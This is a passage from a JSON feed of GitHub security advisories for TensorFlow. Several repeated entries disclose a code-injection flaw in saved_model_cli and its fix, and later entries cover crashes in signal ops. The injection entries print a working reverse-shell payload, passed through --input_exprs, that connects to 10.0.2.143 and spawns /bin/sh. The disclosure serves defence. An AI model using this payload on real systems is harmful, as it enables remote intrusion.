            "content_html": "<h3 id=\"impact\">Impact</h3>\n<p>TensorFlow's <code>saved_model_cli</code> tool is vulnerable to a code injection:</p>\n<pre><code>saved_model_cli run --input_exprs 'x=print(\"malicious code to run\")' --dir ./\n--tag_set serve --signature_def serving_default\n</code></pre>\n<p>This can be used to open a reverse shell                                      </p>\n<pre><code>saved_model_cli run --input_exprs 'hello=exec(\"\"\"\\nimport socket\\nimport\nsubprocess\\ns=socket.socket(socket.AF_INET,socket.SOCK_STREAM)\\ns.connect((\"10.0.2.143\",33419))\\nsubprocess.call([\"/bin/sh\",\"-i\"],stdin=s.fileno(),stdout=s.fileno(),stderr=s.fileno())\"\"\")'\n--dir ./ --tag_set serve --signature_def serving_default\n</code></pre>\n<p>This is because <a href=\"https://github.com/tensorflow/tensorflow/commit/8b202f08d52e8206af2bdb2112a62fafbc546ec7\">the fix</a> for <a href=\"https://nvd.nist.gov/vuln/detail/CVE-2021-41228\">CVE-2021-41228</a> was incomplete. Under <a href=\"https://github.com/tensorflow/tensorflow/blob/f3b9bf4c3c0597563b289c0512e98d4ce81f886e/tensorflow/python/tools/saved_model_cli.py#L566-L574\">certain code paths</a> it still allows unsafe execution:</p>\n<pre><code class=\"language-python\">def preprocess_input_exprs_arg_string(input_exprs_str, safe=True):\n  # ...\n\n  for input_raw in filter(bool, input_exprs_str.split(';')):\n    # ...\n    if safe:\n      # ...\n    else:\n      # ast.literal_eval does not work with numpy expressions\n      input_dict[input_key] = eval(expr)  # pylint: disable=eval-used\n  return input_dict\n</code></pre>\n<p>This code path was maintained for compatibility reasons as we had several test cases where numpy expressions were used as arguments.</p>\n<p>However, given that the tool is always run manually, the impact of this is still not severe. We have now removed the <code>safe=False</code> argument, so all parsing is done withough calling <code>eval</code>.</p>\n<h3 id=\"patches\">Patches</h3>\n<p>We have patched the issue in GitHub commit <a href=\"https://github.com/tensorflow/tensorflow/commit/c5da7af048611aa29e9382371f0aed5018516cac\">c5da7af048611aa29e9382371f0aed5018516cac</a>.</p>\n<p>The fix will be included in TensorFlow 2.9.0. We will also cherrypick this commit on TensorFlow 2.8.1, TensorFlow 2.7.2, and TensorFlow 2.6.4, as these are also affected and still in supported range.</p>\n<h3 id=\"for-more-information\">For more information</h3>\n<p>Please consult <a href=\"https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md\">our security guide</a> for more information regarding the security model and how to contact us with issues and questions.</p>\n<h3 id=\"attribution\">Attribution</h3>\n<p>This vulnerability has been reported by Andey Robins from the Cybersecurity Education and Research Lab in the Department of Computer Science at the University of Wyoming.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/tensorflow/tensorflow/security/advisories/GHSA-75c9-jrh4-79mc\">https://github.com/tensorflow/tensorflow/security/advisories/GHSA-75c9-jrh4-79mc</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2022-29216\">https://nvd.nist.gov/vuln/detail/CVE-2022-29216</a></li>\n<li><a href=\"https://github.com/tensorflow/tensorflow/commit/8b202f08d52e8206af2bdb2112a62fafbc546ec7\">https://github.com/tensorflow/tensorflow/commit/8b202f08d52e8206af2bdb2112a62fafbc546ec7</a></li>\n<li><a href=\"https://github.com/tensorflow/tensorflow/commit/c5da7af048611aa29e9382371f0aed5018516cac\">https://github.com/tensorflow/tensorflow/commit/c5da7af048611aa29e9382371f0aed5018516cac</a></li>\n<li><a href=\"https://github.com/tensorflow/tensorflow/blob/f3b9bf4c3c0597563b289c0512e98d4ce81f886e/tensorflow/python/tools/saved_model_cli.py#L566-L574\">https://github.com/tensorflow/tensorflow/blob/f3b9bf4c3c0597563b289c0512e98d4ce81f886e/tensorflow/python/tools/saved_model_cli.py#L566-L574</a></li>\n<li><a href=\"https://github.com/tensorflow/tensorflow/releases/tag/v2.6.4\">https://github.com/tensorflow/tensorflow/releases/tag/v2.6.4</a></li>\n<li><a href=\"https://github.com/tensorflow/tensorflow/releases/tag/v2.7.2\">https://github.com/tensorflow/tensorflow/releases/tag/v2.7.2</a></li>\n<li><a href=\"https://github.com/tensorflow/tensorflow/releases/tag/v2.8.1\">https://github.com/tensorflow/tensorflow/releases/tag/v2.8.1</a></li>\n<li><a href=\"https://github.com/tensorflow/tensorflow/releases/tag/v2.9.0\">https://github.com/tensorflow/tensorflow/releases/tag/v2.9.0</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-75c9-jrh4-79mc\">https://github.com/advisories/GHSA-75c9-jrh4-79mc</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-75c9-jrh4-79mc",
            "title": "[tensorflow] Code injection in `saved_model_cli`",
            "date_modified": "2022-05-24T22:16:52.000Z",
            "date_published": "2022-05-24T22:16:48.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-75c9-jrh4-79mc"
            }
        },
        {
            "content_html": "<h3 id=\"impact\">Impact</h3>\n<p>TensorFlow's <code>saved_model_cli</code> tool is vulnerable to a code injection:</p>\n<pre><code>saved_model_cli run --input_exprs 'x=print(\"malicious code to run\")' --dir ./\n--tag_set serve --signature_def serving_default\n</code></pre>\n<p>This can be used to open a reverse shell                                      </p>\n<pre><code>saved_model_cli run --input_exprs 'hello=exec(\"\"\"\\nimport socket\\nimport\nsubprocess\\ns=socket.socket(socket.AF_INET,socket.SOCK_STREAM)\\ns.connect((\"10.0.2.143\",33419))\\nsubprocess.call([\"/bin/sh\",\"-i\"],stdin=s.fileno(),stdout=s.fileno(),stderr=s.fileno())\"\"\")'\n--dir ./ --tag_set serve --signature_def serving_default\n</code></pre>\n<p>This is because <a href=\"https://github.com/tensorflow/tensorflow/commit/8b202f08d52e8206af2bdb2112a62fafbc546ec7\">the fix</a> for <a href=\"https://nvd.nist.gov/vuln/detail/CVE-2021-41228\">CVE-2021-41228</a> was incomplete. Under <a href=\"https://github.com/tensorflow/tensorflow/blob/f3b9bf4c3c0597563b289c0512e98d4ce81f886e/tensorflow/python/tools/saved_model_cli.py#L566-L574\">certain code paths</a> it still allows unsafe execution:</p>\n<pre><code class=\"language-python\">def preprocess_input_exprs_arg_string(input_exprs_str, safe=True):\n  # ...\n\n  for input_raw in filter(bool, input_exprs_str.split(';')):\n    # ...\n    if safe:\n      # ...\n    else:\n      # ast.literal_eval does not work with numpy expressions\n      input_dict[input_key] = eval(expr)  # pylint: disable=eval-used\n  return input_dict\n</code></pre>\n<p>This code path was maintained for compatibility reasons as we had several test cases where numpy expressions were used as arguments.</p>\n<p>However, given that the tool is always run manually, the impact of this is still not severe. We have now removed the <code>safe=False</code> argument, so all parsing is done withough calling <code>eval</code>.</p>\n<h3 id=\"patches\">Patches</h3>\n<p>We have patched the issue in GitHub commit <a href=\"https://github.com/tensorflow/tensorflow/commit/c5da7af048611aa29e9382371f0aed5018516cac\">c5da7af048611aa29e9382371f0aed5018516cac</a>.</p>\n<p>The fix will be included in TensorFlow 2.9.0. We will also cherrypick this commit on TensorFlow 2.8.1, TensorFlow 2.7.2, and TensorFlow 2.6.4, as these are also affected and still in supported range.</p>\n<h3 id=\"for-more-information\">For more information</h3>\n<p>Please consult <a href=\"https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md\">our security guide</a> for more information regarding the security model and how to contact us with issues and questions.</p>\n<h3 id=\"attribution\">Attribution</h3>\n<p>This vulnerability has been reported by Andey Robins from the Cybersecurity Education and Research Lab in the Department of Computer Science at the University of Wyoming.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/tensorflow/tensorflow/security/advisories/GHSA-75c9-jrh4-79mc\">https://github.com/tensorflow/tensorflow/security/advisories/GHSA-75c9-jrh4-79mc</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2022-29216\">https://nvd.nist.gov/vuln/detail/CVE-2022-29216</a></li>\n<li><a href=\"https://github.com/tensorflow/tensorflow/commit/8b202f08d52e8206af2bdb2112a62fafbc546ec7\">https://github.com/tensorflow/tensorflow/commit/8b202f08d52e8206af2bdb2112a62fafbc546ec7</a></li>\n<li><a href=\"https://github.com/tensorflow/tensorflow/commit/c5da7af048611aa29e9382371f0aed5018516cac\">https://github.com/tensorflow/tensorflow/commit/c5da7af048611aa29e9382371f0aed5018516cac</a></li>\n<li><a href=\"https://github.com/tensorflow/tensorflow/blob/f3b9bf4c3c0597563b289c0512e98d4ce81f886e/tensorflow/python/tools/saved_model_cli.py#L566-L574\">https://github.com/tensorflow/tensorflow/blob/f3b9bf4c3c0597563b289c0512e98d4ce81f886e/tensorflow/python/tools/saved_model_cli.py#L566-L574</a></li>\n<li><a href=\"https://github.com/tensorflow/tensorflow/releases/tag/v2.6.4\">https://github.com/tensorflow/tensorflow/releases/tag/v2.6.4</a></li>\n<li><a href=\"https://github.com/tensorflow/tensorflow/releases/tag/v2.7.2\">https://github.com/tensorflow/tensorflow/releases/tag/v2.7.2</a></li>\n<li><a href=\"https://github.com/tensorflow/tensorflow/releases/tag/v2.8.1\">https://github.com/tensorflow/tensorflow/releases/tag/v2.8.1</a></li>\n<li><a href=\"https://github.com/tensorflow/tensorflow/releases/tag/v2.9.0\">https://github.com/tensorflow/tensorflow/releases/tag/v2.9.0</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-75c9-jrh4-79mc\">https://github.com/advisories/GHSA-75c9-jrh4-79mc</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-75c9-jrh4-79mc",
            "title": "[tensorflow] Code injection in `saved_model_cli`",
            "date_modified": "2022-05-24T22:16:52.000Z",
            "date_published": "2022-05-24T22:16:48.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-75c9-jrh4-79mc"
            }
        },
        {
            "content_html": "<h3 id=\"impact\">Impact</h3>\n<p>TensorFlow's <code>saved_model_cli</code> tool is vulnerable to a code injection:</p>\n<pre><code>saved_model_cli run --input_exprs 'x=print(\"malicious code to run\")' --dir ./\n--tag_set serve --signature_def serving_default\n</code></pre>\n<p>This can be used to open a reverse shell                                      </p>\n<pre><code>saved_model_cli run --input_exprs 'hello=exec(\"\"\"\\nimport socket\\nimport\nsubprocess\\ns=socket.socket(socket.AF_INET,socket.SOCK_STREAM)\\ns.connect((\"10.0.2.143\",33419))\\nsubprocess.call([\"/bin/sh\",\"-i\"],stdin=s.fileno(),stdout=s.fileno(),stderr=s.fileno())\"\"\")'\n--dir ./ --tag_set serve --signature_def serving_default\n</code></pre>\n<p>This is because <a href=\"https://github.com/tensorflow/tensorflow/commit/8b202f08d52e8206af2bdb2112a62fafbc546ec7\">the fix</a> for <a href=\"https://nvd.nist.gov/vuln/detail/CVE-2021-41228\">CVE-2021-41228</a> was incomplete. Under <a href=\"https://github.com/tensorflow/tensorflow/blob/f3b9bf4c3c0597563b289c0512e98d4ce81f886e/tensorflow/python/tools/saved_model_cli.py#L566-L574\">certain code paths</a> it still allows unsafe execution:</p>\n<pre><code class=\"language-python\">def preprocess_input_exprs_arg_string(input_exprs_str, safe=True):\n  # ...\n\n  for input_raw in filter(bool, input_exprs_str.split(';')):\n    # ...\n    if safe:\n      # ...\n    else:\n      # ast.literal_eval does not work with numpy expressions\n      input_dict[input_key] = eval(expr)  # pylint: disable=eval-used\n  return input_dict\n</code></pre>\n<p>This code path was maintained for compatibility reasons as we had several test cases where numpy expressions were used as arguments.</p>\n<p>However, given that the tool is always run manually, the impact of this is still not severe. We have now removed the <code>safe=False</code> argument, so all parsing is done withough calling <code>eval</code>.</p>\n<h3 id=\"patches\">Patches</h3>\n<p>We have patched the issue in GitHub commit <a href=\"https://github.com/tensorflow/tensorflow/commit/c5da7af048611aa29e9382371f0aed5018516cac\">c5da7af048611aa29e9382371f0aed5018516cac</a>.</p>\n<p>The fix will be included in TensorFlow 2.9.0. We will also cherrypick this commit on TensorFlow 2.8.1, TensorFlow 2.7.2, and TensorFlow 2.6.4, as these are also affected and still in supported range.</p>\n<h3 id=\"for-more-information\">For more information</h3>\n<p>Please consult <a href=\"https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md\">our security guide</a> for more information regarding the security model and how to contact us with issues and questions.</p>\n<h3 id=\"attribution\">Attribution</h3>\n<p>This vulnerability has been reported by Andey Robins from the Cybersecurity Education and Research Lab in the Department of Computer Science at the University of Wyoming.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/tensorflow/tensorflow/security/advisories/GHSA-75c9-jrh4-79mc\">https://github.com/tensorflow/tensorflow/security/advisories/GHSA-75c9-jrh4-79mc</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2022-29216\">https://nvd.nist.gov/vuln/detail/CVE-2022-29216</a></li>\n<li><a href=\"https://github.com/tensorflow/tensorflow/commit/8b202f08d52e8206af2bdb2112a62fafbc546ec7\">https://github.com/tensorflow/tensorflow/commit/8b202f08d52e8206af2bdb2112a62fafbc546ec7</a></li>\n<li><a href=\"https://github.com/tensorflow/tensorflow/commit/c5da7af048611aa29e9382371f0aed5018516cac\">https://github.com/tensorflow/tensorflow/commit/c5da7af048611aa29e9382371f0aed5018516cac</a></li>\n<li><a href=\"https://github.com/tensorflow/tensorflow/blob/f3b9bf4c3c0597563b289c0512e98d4ce81f886e/tensorflow/python/tools/saved_model_cli.py#L566-L574\">https://github.com/tensorflow/tensorflow/blob/f3b9bf4c3c0597563b289c0512e98d4ce81f886e/tensorflow/python/tools/saved_model_cli.py#L566-L574</a></li>\n<li><a href=\"https://github.com/tensorflow/tensorflow/releases/tag/v2.6.4\">https://github.com/tensorflow/tensorflow/releases/tag/v2.6.4</a></li>\n<li><a href=\"https://github.com/tensorflow/tensorflow/releases/tag/v2.7.2\">https://github.com/tensorflow/tensorflow/releases/tag/v2.7.2</a></li>\n<li><a href=\"https://github.com/tensorflow/tensorflow/releases/tag/v2.8.1\">https://github.com/tensorflow/tensorflow/releases/tag/v2.8.1</a></li>\n<li><a href=\"https://github.com/tensorflow/tensorflow/releases/tag/v2.9.0\">https://github.com/tensorflow/tensorflow/releases/tag/v2.9.0</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-75c9-jrh4-79mc\">https://github.com/advisories/GHSA-75c9-jrh4-79mc</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-75c9-jrh4-79mc",
            "title": "[tensorflow-gpu] Code injection in `saved_model_cli`",
            "date_modified": "2022-05-24T22:16:52.000Z",
            "date_published": "2022-05-24T22:16:48.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-75c9-jrh4-79mc"
            }
        },
        {
            "content_html": "<h3 id=\"impact\">Impact</h3>\n<p>TensorFlow's <code>saved_model_cli</code> tool is vulnerable to a code injection:</p>\n<pre><code>saved_model_cli run --input_exprs 'x=print(\"malicious code to run\")' --dir ./\n--tag_set serve --signature_def serving_default\n</code></pre>\n<p>This can be used to open a reverse shell                                      </p>\n<pre><code>saved_model_cli run --input_exprs 'hello=exec(\"\"\"\\nimport socket\\nimport\nsubprocess\\ns=socket.socket(socket.AF_INET,socket.SOCK_STREAM)\\ns.connect((\"10.0.2.143\",33419))\\nsubprocess.call([\"/bin/sh\",\"-i\"],stdin=s.fileno(),stdout=s.fileno(),stderr=s.fileno())\"\"\")'\n--dir ./ --tag_set serve --signature_def serving_default\n</code></pre>\n<p>This is because <a href=\"https://github.com/tensorflow/tensorflow/commit/8b202f08d52e8206af2bdb2112a62fafbc546ec7\">the fix</a> for <a href=\"https://nvd.nist.gov/vuln/detail/CVE-2021-41228\">CVE-2021-41228</a> was incomplete. Under <a href=\"https://github.com/tensorflow/tensorflow/blob/f3b9bf4c3c0597563b289c0512e98d4ce81f886e/tensorflow/python/tools/saved_model_cli.py#L566-L574\">certain code paths</a> it still allows unsafe execution:</p>\n<pre><code class=\"language-python\">def preprocess_input_exprs_arg_string(input_exprs_str, safe=True):\n  # ...\n\n  for input_raw in filter(bool, input_exprs_str.split(';')):\n    # ...\n    if safe:\n      # ...\n    else:\n      # ast.literal_eval does not work with numpy expressions\n      input_dict[input_key] = eval(expr)  # pylint: disable=eval-used\n  return input_dict\n</code></pre>\n<p>This code path was maintained for compatibility reasons as we had several test cases where numpy expressions were used as arguments.</p>\n<p>However, given that the tool is always run manually, the impact of this is still not severe. We have now removed the <code>safe=False</code> argument, so all parsing is done withough calling <code>eval</code>.</p>\n<h3 id=\"patches\">Patches</h3>\n<p>We have patched the issue in GitHub commit <a href=\"https://github.com/tensorflow/tensorflow/commit/c5da7af048611aa29e9382371f0aed5018516cac\">c5da7af048611aa29e9382371f0aed5018516cac</a>.</p>\n<p>The fix will be included in TensorFlow 2.9.0. We will also cherrypick this commit on TensorFlow 2.8.1, TensorFlow 2.7.2, and TensorFlow 2.6.4, as these are also affected and still in supported range.</p>\n<h3 id=\"for-more-information\">For more information</h3>\n<p>Please consult <a href=\"https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md\">our security guide</a> for more information regarding the security model and how to contact us with issues and questions.</p>\n<h3 id=\"attribution\">Attribution</h3>\n<p>This vulnerability has been reported by Andey Robins from the Cybersecurity Education and Research Lab in the Department of Computer Science at the University of Wyoming.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/tensorflow/tensorflow/security/advisories/GHSA-75c9-jrh4-79mc\">https://github.com/tensorflow/tensorflow/security/advisories/GHSA-75c9-jrh4-79mc</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2022-29216\">https://nvd.nist.gov/vuln/detail/CVE-2022-29216</a></li>\n<li><a href=\"https://github.com/tensorflow/tensorflow/commit/8b202f08d52e8206af2bdb2112a62fafbc546ec7\">https://github.com/tensorflow/tensorflow/commit/8b202f08d52e8206af2bdb2112a62fafbc546ec7</a></li>\n<li><a href=\"https://github.com/tensorflow/tensorflow/commit/c5da7af048611aa29e9382371f0aed5018516cac\">https://github.com/tensorflow/tensorflow/commit/c5da7af048611aa29e9382371f0aed5018516cac</a></li>\n<li><a href=\"https://github.com/tensorflow/tensorflow/blob/f3b9bf4c3c0597563b289c0512e98d4ce81f886e/tensorflow/python/tools/saved_model_cli.py#L566-L574\">https://github.com/tensorflow/tensorflow/blob/f3b9bf4c3c0597563b289c0512e98d4ce81f886e/tensorflow/python/tools/saved_model_cli.py#L566-L574</a></li>\n<li><a href=\"https://github.com/tensorflow/tensorflow/releases/tag/v2.6.4\">https://github.com/tensorflow/tensorflow/releases/tag/v2.6.4</a></li>\n<li><a href=\"https://github.com/tensorflow/tensorflow/releases/tag/v2.7.2\">https://github.com/tensorflow/tensorflow/releases/tag/v2.7.2</a></li>\n<li><a href=\"https://github.com/tensorflow/tensorflow/releases/tag/v2.8.1\">https://github.com/tensorflow/tensorflow/releases/tag/v2.8.1</a></li>\n<li><a href=\"https://github.com/tensorflow/tensorflow/releases/tag/v2.9.0\">https://github.com/tensorflow/tensorflow/releases/tag/v2.9.0</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-75c9-jrh4-79mc\">https://github.com/advisories/GHSA-75c9-jrh4-79mc</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-75c9-jrh4-79mc",
            "title": "[tensorflow-cpu] Code injection in `saved_model_cli`",
            "date_modified": "2022-05-24T22:16:52.000Z",
            "date_published": "2022-05-24T22:16:48.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-75c9-jrh4-79mc"
            }
        },
        {
            "content_html": "<h3 id=\"impact\">Impact</h3>\n<p>TensorFlow's <code>saved_model_cli</code> tool is vulnerable to a code injection:</p>\n<pre><code>saved_model_cli run --input_exprs 'x=print(\"malicious code to run\")' --dir ./\n--tag_set serve --signature_def serving_default\n</code></pre>\n<p>This can be used to open a reverse shell                                      </p>\n<pre><code>saved_model_cli run --input_exprs 'hello=exec(\"\"\"\\nimport socket\\nimport\nsubprocess\\ns=socket.socket(socket.AF_INET,socket.SOCK_STREAM)\\ns.connect((\"10.0.2.143\",33419))\\nsubprocess.call([\"/bin/sh\",\"-i\"],stdin=s.fileno(),stdout=s.fileno(),stderr=s.fileno())\"\"\")'\n--dir ./ --tag_set serve --signature_def serving_default\n</code></pre>\n<p>This is because <a href=\"https://github.com/tensorflow/tensorflow/commit/8b202f08d52e8206af2bdb2112a62fafbc546ec7\">the fix</a> for <a href=\"https://nvd.nist.gov/vuln/detail/CVE-2021-41228\">CVE-2021-41228</a> was incomplete. Under <a href=\"https://github.com/tensorflow/tensorflow/blob/f3b9bf4c3c0597563b289c0512e98d4ce81f886e/tensorflow/python/tools/saved_model_cli.py#L566-L574\">certain code paths</a> it still allows unsafe execution:</p>\n<pre><code class=\"language-python\">def preprocess_input_exprs_arg_string(input_exprs_str, safe=True):\n  # ...\n\n  for input_raw in filter(bool, input_exprs_str.split(';')):\n    # ...\n    if safe:\n      # ...\n    else:\n      # ast.literal_eval does not work with numpy expressions\n      input_dict[input_key] = eval(expr)  # pylint: disable=eval-used\n  return input_dict\n</code></pre>\n<p>This code path was maintained for compatibility reasons as we had several test cases where numpy expressions were used as arguments.</p>\n<p>However, given that the tool is always run manually, the impact of this is still not severe. We have now removed the <code>safe=False</code> argument, so all parsing is done withough calling <code>eval</code>.</p>\n<h3 id=\"patches\">Patches</h3>\n<p>We have patched the issue in GitHub commit <a href=\"https://github.com/tensorflow/tensorflow/commit/c5da7af048611aa29e9382371f0aed5018516cac\">c5da7af048611aa29e9382371f0aed5018516cac</a>.</p>\n<p>The fix will be included in TensorFlow 2.9.0. We will also cherrypick this commit on TensorFlow 2.8.1, TensorFlow 2.7.2, and TensorFlow 2.6.4, as these are also affected and still in supported range.</p>\n<h3 id=\"for-more-information\">For more information</h3>\n<p>Please consult <a href=\"https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md\">our security guide</a> for more information regarding the security model and how to contact us with issues and questions.</p>\n<h3 id=\"attribution\">Attribution</h3>\n<p>This vulnerability has been reported by Andey Robins from the Cybersecurity Education and Research Lab in the Department of Computer Science at the University of Wyoming.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/tensorflow/tensorflow/security/advisories/GHSA-75c9-jrh4-79mc\">https://github.com/tensorflow/tensorflow/security/advisories/GHSA-75c9-jrh4-79mc</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2022-29216\">https://nvd.nist.gov/vuln/detail/CVE-2022-29216</a></li>\n<li><a href=\"https://github.com/tensorflow/tensorflow/commit/8b202f08d52e8206af2bdb2112a62fafbc546ec7\">https://github.com/tensorflow/tensorflow/commit/8b202f08d52e8206af2bdb2112a62fafbc546ec7</a></li>\n<li><a href=\"https://github.com/tensorflow/tensorflow/commit/c5da7af048611aa29e9382371f0aed5018516cac\">https://github.com/tensorflow/tensorflow/commit/c5da7af048611aa29e9382371f0aed5018516cac</a></li>\n<li><a href=\"https://github.com/tensorflow/tensorflow/blob/f3b9bf4c3c0597563b289c0512e98d4ce81f886e/tensorflow/python/tools/saved_model_cli.py#L566-L574\">https://github.com/tensorflow/tensorflow/blob/f3b9bf4c3c0597563b289c0512e98d4ce81f886e/tensorflow/python/tools/saved_model_cli.py#L566-L574</a></li>\n<li><a href=\"https://github.com/tensorflow/tensorflow/releases/tag/v2.6.4\">https://github.com/tensorflow/tensorflow/releases/tag/v2.6.4</a></li>\n<li><a href=\"https://github.com/tensorflow/tensorflow/releases/tag/v2.7.2\">https://github.com/tensorflow/tensorflow/releases/tag/v2.7.2</a></li>\n<li><a href=\"https://github.com/tensorflow/tensorflow/releases/tag/v2.8.1\">https://github.com/tensorflow/tensorflow/releases/tag/v2.8.1</a></li>\n<li><a href=\"https://github.com/tensorflow/tensorflow/releases/tag/v2.9.0\">https://github.com/tensorflow/tensorflow/releases/tag/v2.9.0</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-75c9-jrh4-79mc\">https://github.com/advisories/GHSA-75c9-jrh4-79mc</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-75c9-jrh4-79mc",
            "title": "[tensorflow] Code injection in `saved_model_cli`",
            "date_modified": "2022-05-24T22:16:52.000Z",
            "date_published": "2022-05-24T22:16:48.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-75c9-jrh4-79mc"
            }
        },
        {
            "content_html": "<h3 id=\"impact\">Impact</h3>\n<p>The <code>tf.compat.v1.signal.rfft2d</code> and <code>tf.compat.v1.signal.rfft3d</code> lack input validation and under certain condition can result in crashes (due to <code>CHECK</code>-failures).</p>\n<h3 id=\"patches\">Patches</h3>\n<p>We have patched the issue in GitHub commit <a href=\"https://github.com/tensorflow/tensorflow/commit/0a8a781e597b18ead006d19b7d23d0a369e9ad73\">0a8a781e597b18ead006d19b7d23d0a369e9ad73</a> (merging GitHub PR <a href=\"https://github.com/tensorflow/tensorflow/pull/55274\">#55274</a>).</p>\n<p>The fix will be included in TensorFlow 2.9.0. We will also cherrypick this commit on TensorFlow 2.8.1, TensorFlow 2.7.2, and TensorFlow 2.6.4, as these are also affected and still in supported range.</p>\n<h3 id=\"for-more-information\">For more information</h3>\n<p>Please consult <a href=\"https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md\">our security guide</a> for more information regarding the security model and how to contact us with issues and questions.</p>\n<h3 id=\"attribution\">Attribution</h3>\n<p>This vulnerability has been reported externally via a <a href=\"https://github.com/tensorflow/tensorflow/issues/55263\">GitHub issue</a>.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/tensorflow/tensorflow/security/advisories/GHSA-5889-7v45-q28m\">https://github.com/tensorflow/tensorflow/security/advisories/GHSA-5889-7v45-q28m</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2022-29213\">https://nvd.nist.gov/vuln/detail/CVE-2022-29213</a></li>\n<li><a href=\"https://github.com/tensorflow/tensorflow/issues/55263\">https://github.com/tensorflow/tensorflow/issues/55263</a></li>\n<li><a href=\"https://github.com/tensorflow/tensorflow/pull/55274\">https://github.com/tensorflow/tensorflow/pull/55274</a></li>\n<li><a href=\"https://github.com/tensorflow/tensorflow/commit/0a8a781e597b18ead006d19b7d23d0a369e9ad73\">https://github.com/tensorflow/tensorflow/commit/0a8a781e597b18ead006d19b7d23d0a369e9ad73</a></li>\n<li><a href=\"https://github.com/tensorflow/tensorflow/releases/tag/v2.6.4\">https://github.com/tensorflow/tensorflow/releases/tag/v2.6.4</a></li>\n<li><a href=\"https://github.com/tensorflow/tensorflow/releases/tag/v2.7.2\">https://github.com/tensorflow/tensorflow/releases/tag/v2.7.2</a></li>\n<li><a href=\"https://github.com/tensorflow/tensorflow/releases/tag/v2.8.1\">https://github.com/tensorflow/tensorflow/releases/tag/v2.8.1</a></li>\n<li><a href=\"https://github.com/tensorflow/tensorflow/releases/tag/v2.9.0\">https://github.com/tensorflow/tensorflow/releases/tag/v2.9.0</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-5889-7v45-q28m\">https://github.com/advisories/GHSA-5889-7v45-q28m</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-5889-7v45-q28m",
            "title": "[tensorflow-gpu] Incomplete validation in signal ops leads to crashes",
            "date_modified": "2022-05-24T22:16:32.000Z",
            "date_published": "2022-05-24T22:16:29.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-5889-7v45-q28m"
            }
        },
        {
            "content_html": "<h3 id=\"impact\">Impact</h3>\n<p>The <code>tf.compat.v1.signal.rfft2d</code> and <code>tf.compat.v1.signal.rfft3d</code> lack input validation and under certain condition can result in crashes (due to <code>CHECK</code>-failures).</p>\n<h3 id=\"patches\">Patches</h3>\n<p>We have patched the issue in GitHub commit <a href=\"https://github.com/tensorflow/tensorflow/commit/0a8a781e597b18ead006d19b7d23d0a369e9ad73\">0a8a781e597b18ead006d19b7d23d0a369e9ad73</a> (merging GitHub PR <a href=\"https://github.com/tensorflow/tensorflow/pull/55274\">#55274</a>).</p>\n<p>The fix will be included in TensorFlow 2.9.0. We will also cherrypick this commit on TensorFlow 2.8.1, TensorFlow 2.7.2, and TensorFlow 2.6.4, as these are also affected and still in supported range.</p>\n<h3 id=\"for-more-information\">For more information</h3>\n<p>Please consult <a href=\"https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md\">our security guide</a> for more information regarding the security model and how to contact us with issues and questions.</p>\n<h3 id=\"attribution\">Attribution</h3>\n<p>This vulnerability has been reported externally via a <a href=\"https://github.com/tensorflow/tensorflow/issues/55263\">GitHub issue</a>.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/tensorflow/tensorflow/security/advisories/GHSA-5889-7v45-q28m\">https://github.com/tensorflow/tensorflow/security/advisories/GHSA-5889-7v45-q28m</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2022-29213\">https://nvd.nist.gov/vuln/detail/CVE-2022-29213</a></li>\n<li><a href=\"https://github.com/tensorflow/tensorflow/issues/55263\">https://github.com/tensorflow/tensorflow/issues/55263</a></li>\n<li><a href=\"https://github.com/tensorflow/tensorflow/pull/55274\">https://github.com/tensorflow/tensorflow/pull/55274</a></li>\n<li><a href=\"https://github.com/tensorflow/tensorflow/commit/0a8a781e597b18ead006d19b7d23d0a369e9ad73\">https://github.com/tensorflow/tensorflow/commit/0a8a781e597b18ead006d19b7d23d0a369e9ad73</a></li>\n<li><a href=\"https://github.com/tensorflow/tensorflow/releases/tag/v2.6.4\">https://github.com/tensorflow/tensorflow/releases/tag/v2.6.4</a></li>\n<li><a href=\"https://github.com/tensorflow/tensorflow/releases/tag/v2.7.2\">https://github.com/tensorflow/tensorflow/releases/tag/v2.7.2</a></li>\n<li><a 